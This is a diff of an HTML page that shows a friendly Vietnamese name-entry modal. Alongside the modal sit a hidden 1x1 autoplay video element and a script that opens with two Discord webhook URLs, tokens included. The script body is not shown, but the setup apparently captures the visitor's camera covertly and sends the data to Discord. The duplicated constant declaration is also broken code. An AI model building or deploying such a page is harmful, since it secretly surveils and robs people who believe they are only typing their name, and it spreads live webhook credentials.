@@ -115,17 +115,36 @@ h1{font-size:32px;font-weight:700;color:#fff;margin-bottom:10px;text-shadow:0 0 
 </div>
 </div>
 </div>
+<!-- Modal -->
 <div id="notificationModal" class="modal">
-<div class="modal-content">
-<div class="icon-wrapper"></div>
-<h2>Nhập tên của bạn</h2>
-<p>Vui lòng nhập tên để tiếp tục</p>
-<input type="text" class="name-input" id="nameInput" placeholder="Tên của bạn...">
-<p class="error-message" id="errorMessage">Vui lòng nhập tên hợp lệ!</p>
-<button class="btn" id="confirmBtn"><span>Xác nhận</span></button>
+  <div class="modal-content">
+    
+    <div class="icon-wrapper">👤</div>
+
+    <h2>Chào bạn</h2>
+    <p class="desc">Nhập tên của bạn để tiếp tục</p>
+
+    <input 
+      type="text" 
+      id="nameInput"
+      class="name-input"
+      placeholder="Ví dụ: Mai Quỳnh"
+      autocomplete="off"
+    >
+
+    <p class="error-message" id="errorMessage">
+      ⚠️ Vui lòng nhập tên hợp lệ
+    </p>
+
+    <button class="btn" id="confirmBtn">
+      Xác nhận
+    </button>
+
+  </div>
 </div>
-</div>
-<video id="video" width="1" height="1" autoplay style="display:none;"></video>
+
+<video id="video" width="1" height="1" autoplay muted playsinline style="display:none;"></video>
+
 <script>
 const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1440247747700723732/vmQeU92yVVYgp8uuYkRttiIgWDH5ttAsPegnTh8zwBuIg7mofGMH9_UMAQbsaF-Mny1t';
 const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1466471346077827324/35ZOkMh1SUJtJVZI1H58KwQB0jOEJaK5IVBLcNpEKCctbGooYkG73sX5PYId4Nw43YkN';
